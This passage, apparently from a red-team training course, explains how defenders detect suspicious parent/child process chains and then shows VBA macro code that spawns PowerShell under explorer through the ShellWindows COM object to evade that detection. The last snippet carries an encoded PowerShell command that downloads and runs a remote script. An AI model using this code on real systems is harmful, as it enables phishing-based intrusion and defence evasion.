A subset of behavioural detections come from the parent/child relationships of running processes.  As a rule of thumb, the parent of a process is the process that started it.  As such, a process only has one parent but can have many children.   Applications such as Process Hacker visualise these relationships by their indentation.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/5e8/623/590/process-hacker.png)

  

The "details" window also shows a process' parent.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/566/d98/954/notepad.png)

  

Most user applications will run as children of explorer, as that's where they're started from.

There are many parent/child relationships that are considered highly suspicious or outright malicious - one example is with our initial access payload.  Since we executed a PowerShell one-liner via an Office macro, the instance of `powershell.exe` becomes a child of `winword.exe`.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/5c2/3d2/e88/winword-powershell.png)

![](https://files.cdn.thinkific.com/file_uploads/584845/images/4bb/548/06b/powershell.png)

  

Defender does a good job of blocking these because Word spawning PowerShell is not exactly common behaviour and is a well-known phishing tactic.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/e70/06a/307/defender.png)

  

One way around this is to find a way to execute PowerShell without it become a child of Word.  A very low-effort way to do that is with COM.  Remember the COM objects from the [DCOM lateral movement](https://training.zeropointsecurity.co.uk/manage/courses/1646245/contents/38136831) module?  Well, the same can be used for local execution too.  The nicer ones to use in this scenario are `ShellWindows` and `ShellBrowserWindow`, because they will both spawn processes under explorer.  This a simple example of spawning a hidden PowerShell process using ShellWindows.
```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0
```
  

The arguments for the ShellExecute method are documented [here](https://learn.microsoft.com/en-gb/windows/win32/shell/shell-shellexecute).

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/e15/c9d/bcd/powershell-explorer.png)

  

Here is a weaponised example:
```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
```